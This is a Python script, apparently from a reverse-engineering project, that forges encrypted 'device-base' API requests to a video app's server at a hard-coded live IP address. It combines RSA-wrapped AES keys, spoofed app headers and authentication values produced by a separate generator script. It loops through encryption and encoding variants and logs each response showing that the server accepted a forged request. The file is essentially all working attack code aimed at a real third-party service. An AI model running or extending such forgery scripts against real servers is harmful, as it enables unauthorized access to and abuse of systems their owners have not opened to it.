"""forge_v2.py — 按抓包结构精确伪造 device-base 请求
抓包事实: body 369ch = P0 344ch(256B) + '.' + P1 24ch(16B 单 AES 块)
=> 请求参数为空, P1 = AES(key, iv, PKCS7(b'')) 单块; 身份在 authentication 头
变体: P0 载荷 {K+IV, K(自解IV), K(IV=0)} × 字母表 {custom, std} × P1明文 {b'', b'{}'}
判据: 响应 409ch P0.P1 且 P0 可用 priv_from_go 解包 => 服务器接受了伪造
闭环: 用我的 K/IV 解响应 P1 => 服务器逐请求无状态确认
"""
import base64
import os
import random
import subprocess
import sys
import time
import urllib.request
import urllib.error

from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "..", "..", ".."))
sys.path.insert(0, os.path.join(ROOT, "src"))
for p in (os.path.join(ROOT, "research", "deliverables"),):
    if p not in sys.path:
        sys.path.insert(0, p)

from jcy_protocol.auth import ALPHABET, STD_B64  # noqa: E402
from jcy_protocol.auth import custom_b64d  # noqa: E402

URL = "http://43.145.33.254:27990/app/video/device-base"
PUB = RSA.import_key(open(HERE + "/server_pub_2048_live.pem", "rb").read())
_TO_CUSTOM = str.maketrans(STD_B64, ALPHABET)

HEADERS_BASE = {
    "x-version": "2020-09-17",
    "user-agent": "Dart/3.6 (dart:io)",
    "appid": "4150439554430529",
    "tcs": "2",
    "content-type": "application/json; charset=utf-8",
    "accept-encoding": "gzip",
    "host": "43.145.33.254:27990",
}


def cb64(b, custom):
    s = base64.b64encode(b).decode()
    return s.translate(_TO_CUSTOM) if custom else s


def rsa_v15(payload):
    return PKCS1_v1_5.new(PUB).encrypt(payload)


def gen_auth(ts):
    out = subprocess.run(
        [sys.executable, "research/deliverables/authgen.py", "--ts", str(ts)],
        capture_output=True, text=True, timeout=300, cwd=ROOT)
    for line in (out.stdout + out.stderr).splitlines():
        if "auth" in line and "=" in line:
            v = line.split("=", 1)[1].strip()
            if len(v) >= 100:
                return v
    raise RuntimeError("authgen fail: " + (out.stdout + out.stderr)[-300:])


def attempt(tag, k16, iv16, payload_mode, custom, plain):
    if payload_mode == "k+iv":
        p0 = rsa_v15(k16 + iv16)
    elif payload_mode == "k":
        p0 = rsa_v15(k16)
    else:
        p0 = rsa_v15(k16)
        iv16 = bytes(16)
    p1 = AES.new(k16, AES.MODE_CBC, iv16).encrypt(pad(plain, 16))
    body = cb64(p0, custom) + "." + cb64(p1, custom)
    ts = int(time.time() * 1000)
    nonce = str(random.randint(10_000_000, 99_999_999))
    headers = dict(HEADERS_BASE)
    headers["ts"] = str(ts)
    headers["nonce"] = nonce
    headers["authentication"] = gen_auth(ts)
    req = urllib.request.Request(URL, data=body.encode(), headers=headers, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=15)
        rbody = resp.read().decode("utf-8", "replace")
        code = resp.status
    except urllib.error.HTTPError as e:
        rbody = e.read().decode("utf-8", "replace")
        code = e.code
    except Exception as e:
        print("  [%s] EXC %s" % (tag, e))
        return None
    shape = "P0.P1" if "." in rbody and len(rbody) > 100 else "other(%d):%s" % (len(rbody), rbody[:120])
    print("  [%s] http=%d len=%d %s" % (tag, code, len(rbody), shape))
    if "." in rbody and len(rbody) > 100:
        open(os.path.join(HERE, "forge_v2_hit.txt"), "a").write(
            json.dumps({"tag": tag, "k16": k16.hex(), "iv16": iv16.hex(),
                        "body": body, "resp": rbody}) + "\n")
        return rbody
    return None


import json  # noqa: E402


def main():
    random.seed()
    hits = 0
    for payload_mode in ("k+iv", "k", "k_iv0"):
        for custom in (True, False):
            for plain in (b"", b"{}"):
                k16 = bytes(random.randrange(256) for _ in range(16))
                iv16 = bytes(random.randrange(256) for _ in range(16))
                tag = "%s|%s|%s" % (payload_mode, "cust" if custom else "std",
                                    "empty" if plain == b"" else "{}")
                r = attempt(tag, k16, iv16, payload_mode, custom, plain)
                if r:
                    hits += 1
    print("done, hits =", hits)


if __name__ == "__main__":
    main()
